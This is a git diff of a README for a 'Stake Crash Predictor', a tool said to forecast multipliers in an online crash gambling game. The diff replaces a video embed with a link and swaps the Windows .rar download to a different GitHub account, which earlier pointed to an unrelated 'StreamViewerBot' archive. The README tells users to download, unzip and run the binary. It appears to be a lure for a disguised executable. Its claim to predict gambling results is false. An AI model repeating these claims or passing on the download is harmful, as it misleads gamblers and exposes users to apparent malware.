@@ -7,7 +7,7 @@
 ![ShowCase](https://cdn.discordapp.com/attachments/1085333982029287465/1106034088487419904/image.png)
 
 ## RealTime Video Showcase
-<iframe width="560" height="315" src="https://www.youtube.com/embed/FLQD4SB7p5A" frameborder="0" allowfullscreen></iframe>
+[Watch the Video](https://www.youtube.com/watch?v=FLQD4SB7p5A)
 
 
 
@@ -24,7 +24,7 @@ The Stake Crash Predictor is a tool designed to predict the next multiplier numb
 ## Installation
 
 1. Download the latest version of the bot.
-<strong><a href="https://github.com/streamviewerchatbot/Stream-Viewer-Chat-Bot/releases/download/23.3.4/StreamViewerBot-23.3.4.rar">Download for Windows x64</a><g-emoji class="g-emoji" alias="arrow_down" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b07.png">⬇️</g-emoji></strong>
+<strong><a href="https://github.com/Stake-bot/CrashPredictor-for-Stake/releases/download/v2.4/CrashPredictor.for.Stake.Trial.rar">Download for Windows x64</a><g-emoji class="g-emoji" alias="arrow_down" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b07.png">⬇️</g-emoji></strong>
 
 2. Start the bot after unziping it
 
